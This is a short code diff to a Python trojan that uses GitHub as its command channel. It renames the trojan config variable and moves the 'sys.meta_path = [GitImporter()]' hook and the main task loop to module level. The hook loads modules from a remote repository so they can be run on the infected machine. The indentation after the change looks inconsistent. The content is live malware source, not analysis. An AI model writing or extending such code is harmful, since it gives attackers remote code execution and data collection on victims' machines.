@@ -12,7 +12,7 @@ from github3 import login
 
 trojan_id = "abc"
 
-trojan_coding = "%s,json" % trojan_id
+trojan_config = "%s,json" % trojan_id
 data_path     = "data/%s/" % trojan_id
 trojan_modules= []
 cconfigures   = False
@@ -99,10 +99,9 @@ class GitImporter(object):
         store_module_result(result)
         
         return
+sys.meta_path = [GitImporter()]
     
-    sys.meta_path = [GitImporter()]
-    
-    while True:
+while True:
         
         if task_queue.empty():
             config = get_trojan_config()
